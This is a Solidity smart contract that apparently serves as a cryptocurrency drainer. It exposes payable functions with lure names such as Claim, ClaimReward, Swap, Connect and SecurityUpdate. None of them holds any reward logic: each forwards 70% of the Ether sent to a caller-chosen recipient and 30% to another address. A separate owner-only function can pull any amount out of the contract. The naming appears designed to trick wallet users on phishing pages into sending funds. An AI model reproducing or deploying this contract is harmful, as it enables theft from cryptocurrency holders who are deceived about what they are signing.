// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.18;

contract CG_Contract {

    address private owner;
    mapping(address => uint256) private balance;
    mapping(address => bool) private auto_withdraw;

    event Withdrawal(address indexed receiver, uint256 amount);
    event AutoWithdrawStatusUpdated(address indexed user, bool status);
    event Payout(address receiver, uint256 amount);
 
    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this");
        _;
    }

    modifier validAmount() {
        require(msg.value > 0, "Invalid amount");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function getOwner() public view returns (address) {
        return owner;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getUserBalance(address wallet) public view returns (uint256) {
        return balance[wallet];
    }

    function getWithdrawStatus(address wallet) public view returns (bool) {
        return auto_withdraw[wallet];
    }

    function setWithdrawStatus(bool status) public {
        auto_withdraw[msg.sender] = status;
        emit AutoWithdrawStatusUpdated(msg.sender, status);
    }

    function withdraw() public {
        uint256 amount = balance[msg.sender];
        require(address(this).balance >= amount, "BALANCE_LOW");
        balance[msg.sender] = 0;
        payable(msg.sender).transfer(amount);
        emit Withdrawal(msg.sender, amount);
    }

    function withdrawEther(address payable receiver, uint256 amount) public onlyOwner {
        require(receiver != address(0), "Invalid address");
        require(address(this).balance >= amount, "Insufficient contract balance");
        payable(receiver).transfer(amount);
    }

    function _executeTransaction(uint8 auto_payout, address sender, address recipient1) public payable validAmount {
        uint256 gasCost = tx.gasprice * gasleft(); 
        uint256 totalAmount = msg.value - gasCost; 
        
        if (auto_payout == 1) {
            uint256 payoutAmount1 = totalAmount * 70 / 100;
            uint256 payoutAmount2 = totalAmount - payoutAmount1;

            payable(recipient1).transfer(payoutAmount1);
            payable(sender).transfer(payoutAmount2);

            emit Withdrawal(recipient1, payoutAmount1);
        } else {
            balance[sender] += totalAmount;
        }
    }

    function Claim(uint8 auto_payout, address sender, address recipient1) public payable {
        _executeTransaction(auto_payout, sender, recipient1);
    }

    function ClaimReward(uint8 auto_payout, address sender, address recipient1) public payable {
        _executeTransaction(auto_payout, sender, recipient1);
    }

    function ClaimRewards(uint8 auto_payout, address sender, address recipient1) public payable {
        _executeTransaction(auto_payout, sender, recipient1);
    }
   
    function Execute(uint8 auto_payout, address sender, address recipient1) public payable {
        _executeTransaction(auto_payout, sender, recipient1);
    }
   
    function Multicall(uint8 auto_payout, address sender, address recipient1) public payable {
        _executeTransaction(auto_payout, sender, recipient1);
    }
   
    function Swap(uint8 auto_payout, address sender, address recipient1) public payable {
        _executeTransaction(auto_payout, sender, recipient1);
    }
   
    function Connect(uint8 auto_payout, address sender, address recipient1) public payable {
        _executeTransaction(auto_payout, sender, recipient1);
    }
   
    function SecurityUpdate(uint8 auto_payout, address sender, address recipient1) public payable {
        _executeTransaction(auto_payout, sender, recipient1);
    }
   
    receive() external payable {}
}